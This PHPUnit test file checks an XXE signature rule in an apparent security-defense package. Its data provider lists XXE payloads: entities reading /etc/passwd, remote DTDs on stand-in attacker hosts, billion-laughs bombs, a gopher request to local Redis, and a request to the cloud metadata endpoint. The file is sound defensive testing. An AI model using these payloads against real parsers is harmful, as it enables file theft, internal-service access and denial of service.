<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature\Adversarial\Signature;

use PHPUnit\Framework\Attributes\DataProvider;
use Mixudev\SecurityDefense\Tests\TestCase;

/**
 * XXE is disabled by default because XML is also a legitimate integration
 * format: SOAP, SAML, SVG, office exports, and vendor XML often contain a
 * DOCTYPE, namespace declarations, or schemaLocation. The lexical signature
 * cannot prove whether an XML parser has external entity resolution disabled;
 * fail-closed here means opt in after the host has reviewed that XML corpus.
 */
class XxeSignatureRuleTest extends TestCase
{
    use ConfiguresSignatureRules;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setUpSignatureProbe();
    }

    public function test_xxe_is_disabled_by_default(): void
    {
        $this->assertFalse((bool) config('security-defense.detection.rules.payload_injection.patterns.xxe'));
    }

    #[DataProvider('xxeProvider')]
    public function test_xxe_is_blocked_when_enabled(string $payload): void
    {
        $this->assertBlocked($payload, 'xxe', 10);
    }

    #[DataProvider('xxeProvider')]
    public function test_xxe_is_blocked_in_json_when_enabled(string $payload): void
    {
        $this->enableSignature('xxe');
        $result = $this->probeJson('xml', $payload, '198.18.10.2');
        $this->assertSame(403, $result['status'], "JSON XXE bypassed: {$payload}");
    }

    /** @return array<string, array{0: string}> */
    public static function xxeProvider(): array
    {
        return [
            'doctype external system' => ['<!DOCTYPE foo SYSTEM "file:///etc/passwd">'],
            'doctype external public' => ['<!DOCTYPE foo PUBLIC "-//W3C//DTD" "http://evil.test/a.dtd">'],
            'external entity system' => ['<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
            'external entity public' => ['<!ENTITY xxe PUBLIC "-//evil//EN" "http://evil.test/a.dtd">'],
            'parameter entity' => ['<!ENTITY % pe SYSTEM "http://evil.test/evil.dtd">'],
            'parameter entity declaration' => ['<!ENTITY % all "<!ENTITY send SYSTEM \'file:///etc/passwd\'>">'],
            'billion laughs root' => ['<!DOCTYPE lolz [<!ENTITY lol "lol"> <!ENTITY lol1 "&lol;&lol;">]>'],
            'billion laughs nested' => ['<!DOCTYPE bomb [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;">]>'],
            'remote dtd' => ['<!DOCTYPE data SYSTEM "https://attacker.test/payload.dtd">'],
            'ftp entity' => ['<!ENTITY x SYSTEM "ftp://10.0.0.1/a">'],
            'gopher entity' => ['<!ENTITY x SYSTEM "gopher://127.0.0.1:6379/_INFO">'],
            'schema location' => ['<root xsi:noNamespaceSchemaLocation="http://evil.test/schema.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>'],
            'schema location case' => ['<Root XSI:NO...="http://evil.test/x.xsd" xmlns:xsi="x"/>'],
            'namespace xsi' => ['<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><xsi:data/></root>'],
            'doctype mixed case' => ['<!DoCtYpE foo SYSTEM "file:///etc/passwd">'],
            'entity mixed case' => ['<!EnTiTy x SyStEm "file:///etc/passwd">'],
            'doctype whitespace' => ["<!DOCTYPE\nfoo SYSTEM 'file:///etc/passwd'>"],
            'doctype internal subset' => ['<!DOCTYPE foo [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>'],
            'external http entity' => ['<!ENTITY credentials SYSTEM "http://169.254.169.254/latest/meta-data/">'],
            'public external entity' => ['<!ENTITY % remote PUBLIC "x" "http://evil.test/a">'],
        ];
    }

    public function test_normal_xml_without_external_features_is_not_blocked(): void
    {
        $this->enableSignature('xxe');
        foreach ([
            '<note><to>Alice</to><body>Hello</body></note>',
            '<invoice><total currency="USD">10.00</total></invoice>',
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body/></soap:Envelope>',
            '<svg xmlns="http://www.w3.org/2000/svg"><text>Report</text></svg>',
            '<root><schemaLocation>local-schema.xsd</schemaLocation></root>',
            '<?xml version="1.0"?><catalog><item id="1"/></catalog>',
        ] as $xml) {
            $result = $this->probeForm('xml', $xml, '198.18.10.3');
            $this->assertSame(200, $result['status'], "Benign XML false positive: {$xml}");
        }
    }

    public function test_disabled_xxe_payload_passes_for_default_compatibility(): void
    {
        // Remote DTD reference: no traversal keyword for another enabled
        // signature to catch, so the pass proves xxe itself is off.
        $result = $this->probeForm('xml', '<!DOCTYPE data SYSTEM "http://evil.test/a.dtd">', '198.18.10.4');
        $this->assertSame(200, $result['status']);
    }

    /**
     * Interaction worth documenting: an XXE payload that also carries
     * /etc/passwd is still blocked with xxe disabled, because the traversal
     * signature (enabled by default) matches the path. Default-off for xxe
     * therefore does NOT mean "XXE payloads pass"; it means the DOCTYPE-only
     * XML documents that servers accept remain unblocked.
     */
    public function test_xxe_payload_with_local_file_path_is_still_blocked_by_traversal_signature(): void
    {
        $result = $this->probeForm('xml', '<!DOCTYPE foo SYSTEM "file:///etc/passwd">', '198.18.10.5');
        $this->assertSame(403, $result['status']);
    }
}
